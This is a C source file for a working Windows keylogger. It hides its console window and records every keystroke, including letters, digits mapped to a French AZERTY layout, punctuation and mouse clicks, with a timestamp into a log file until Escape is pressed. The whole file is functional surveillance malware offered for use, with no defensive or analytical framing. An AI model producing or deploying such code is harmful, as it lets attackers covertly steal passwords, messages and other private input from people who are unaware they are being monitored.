// KeyLogger for Windows machine

#include <stdio.h>
#include <ctype.h>
#include <windows.h>
#include "win_keylog.h"

// Define special keys
/* https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes */
int specialKeys[] = {
    VK_BACK, 
    VK_RETURN, 
    VK_SPACE, 
    VK_MENU,
    VK_TAB, 
    VK_SHIFT, 
    VK_CONTROL, 
    VK_ESCAPE, 
    VK_END, 
    VK_HOME, 
    VK_LEFT, 
    VK_UP, 
    VK_RIGHT, 
    VK_DOWN, 
    VK_DELETE,
    VK_LBUTTON,
    VK_RBUTTON,
    VK_MBUTTON,
    VK_XBUTTON1,
    VK_XBUTTON2,
    VK_OEM_PERIOD,
    VK_OEM_COMMA,
    VK_OEM_1,
    VK_OEM_2,
    VK_OEM_PLUS,
    VK_OEM_MINUS,
    VK_DIVIDE,
    VK_MULTIPLY,
    VK_SUBTRACT,
    VK_ADD,
    VK_OEM_102,
    0x30,
    0x31,
    0x32,
    0x33,
    0x34,
    0x35,
    0x36,
    0x37,
    0x38,
    0x39,
};

// Whenever the keylogger is started, add this to the file first
void WriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    SYSTEMTIME st;
    GetLocalTime(&st);
    char date[100];
    sprintf(date, "[%02d/%02d/%04d %02d:%02d:%02d] : ", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Write the captured key into a file
void WriteIntoFile(char data, const char* filePath) {

    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }
    char dataStr[2];
    sprintf(dataStr, "%c", data);
    fputs(dataStr, file);
    fflush(file);

    fclose(file);
}

// Write the captured special key into a file
void WriteSpecialKeyIntoFile(char *data, const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the special key into the file
    fputs(data, file);
    fflush(file);

    fclose(file);
}

// Convert special key into readable key
char* SpecialKeyToReadable(int data) {
    char *specialKey = NULL;

    switch(data) {
        case VK_BACK:
            specialKey = "[BACKSPACE]";
            break;
        case VK_RETURN:
            specialKey = "[ENTER]";
            break;
        case VK_SPACE:
            specialKey = " ";
            break;
        case VK_MENU:
            specialKey = "[ALT]";
            break;
        case VK_TAB:
            specialKey = "[TAB]";
            break;
        case VK_SHIFT:
            specialKey = "[SHIFT]";
            break;
        case VK_CONTROL:
            specialKey = "[CONTROL]";
            break;
        case VK_ESCAPE:
            specialKey = "[ESCAPE]";
            break;
        case VK_END:
            specialKey = "[END]";
            break;
        case VK_HOME:
            specialKey = "[HOME]";
            break;
        case VK_LEFT:
            specialKey = "[LEFT]";
            break;
        case VK_UP:
            specialKey = "[UP]";
            break;
        case VK_RIGHT: 
            specialKey = "[RIGHT]";
            break; 
        case VK_DOWN: 
            specialKey = "[DOWN]";
            break;
        case VK_DELETE:
            specialKey = "[DELETE]";
            break;
        case VK_LBUTTON:
            specialKey = "[LEFT CLICK]";
            break;
        case VK_RBUTTON:
            specialKey = "[RIGHT CLICK]";
            break;
        case VK_MBUTTON:
            specialKey = "[MIDDLE CLICK]";
            break;
        case VK_XBUTTON1:
            specialKey = "[X1 CLICK]";
            break;
        case VK_XBUTTON2:
            specialKey = "[X2 CLICK]";
            break;
        case VK_OEM_PERIOD:
            specialKey = ".";
            break;
        case VK_OEM_COMMA:
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "?";
            } else {
                specialKey = ",";
            }
            break;
        case VK_OEM_1:
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = ".";
            } else {
                specialKey = ";";
            }
            break;
        case VK_OEM_2:
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "/";
            } else {
                specialKey = ":";
            }
            break;
        case VK_OEM_PLUS:
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "+";
            } else if (GetKeyState(VK_RMENU) & 0x0001) {
                specialKey = "=";
            } else {
                specialKey = "}";
            }
            break;
        case VK_DIVIDE:
            specialKey = "/";
            break;
        case VK_MULTIPLY:
            specialKey = "*";
            break;
        case VK_SUBTRACT:
            specialKey = "-";
            break;
        case VK_ADD:
            specialKey = "+";
            break;
        case VK_OEM_102:
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000) {
                specialKey = ">";
            } else {
                specialKey = "<";
            }
            break;
        case 0x31: // touch "1"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "1";
            } else {
                specialKey = "&";
            }
            break;
        case 0x32: // touch "2"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "2";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "~";
            } else {
                specialKey = "é";
            }
            break;
        case 0x33: // touch "3"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "3";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "#";
            } else {
                specialKey = "\"";
            }
            break;
        case 0x34: // touch "4"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "4";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "{";
            } else {
                specialKey = "'";
            }
            break;
        case 0x35: // touch "5"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "5";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "[";
            } else {
                specialKey = "(";
            }
            break;
        case 0x36: // touch "6"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "6";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "|";
            } else {
                specialKey = "-";
            }
            break;
        case 0x37: // touch "7"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "7";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "`";
            } else {
                specialKey = "è";
            }
            break;
        case 0x38: // touch "8"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "8";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "\\";
            } else {
                specialKey = "_";
            }
            break;
        case 0x39: // touch "9"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "9";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "^";
            } else {
                specialKey = "ç";
            }
            break;
        case 0x30: // touch "0"
            if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                specialKey = "0";
            } else if ((GetKeyState(VK_RMENU)) & 0x8000) {
                specialKey = "@";
            } else {
                specialKey = "à";
            }
            break;    
        default:
            break;
    }
    return specialKey;
}

// Check if the key is a special key
int CheckSpecialKey(int data) {
    int isSpecialKey = 0;
    int specialKeysLength = sizeof(specialKeys) / sizeof(specialKeys[0]);

    for (int i = 0; i < specialKeysLength; i++) {
        if (data == specialKeys[i]) {
            isSpecialKey = 1;
            break;
        }
    }
    return isSpecialKey;
}

// Keylogger for Windows
void windows_keylog(const char* filePath) {

    // Clear the log file
    FILE *temp;
    temp = fopen(filePath, "a+");
    fclose(temp);

    // Write the header into the file
    WriteHeader(filePath);

    // Hide the console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Infinite loop
    while(1) {
        // Sleep for 10ms
        Sleep(10);

        // Loop through all the ASCII characters
        for (int key = 0; key <= 255; key++) {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Check if the key is a special key
                int isSpecialKey = CheckSpecialKey(key);
                if (isSpecialKey) {
                    // Convert special key into readable key
                    char *specialKey = SpecialKeyToReadable(key);
                    if (specialKey != NULL) {
                        WriteSpecialKeyIntoFile(specialKey, filePath);
                    }
                } else {
                    // Check if the key is a letter
                    if (isalpha(key)) {
                        // Check if the key is uppercase
                        if (GetKeyState(VK_CAPITAL) & 0x0001 || GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000) {
                            key = toupper(key);
                            WriteIntoFile(toupper(key), filePath);
                        } else {
                            WriteIntoFile(tolower(key), filePath);
                        }
                    }
                }
            }
        }

        // Check if the keylogger should end
        end_keylog(filePath);
    }
}

// End the keylogger
void end_keylog(const char* filePath) {
    // If the escape key is pressed, end the keylogger
    if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
        // Add a new line to the file
        FILE *file;
        file = fopen(filePath, "a");
        if (file == NULL) {
            return;
        }
        fputs("\n", file);
        fflush(file);
        fclose(file);

        // Show the console
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_SHOW);
        exit(0);
    }
}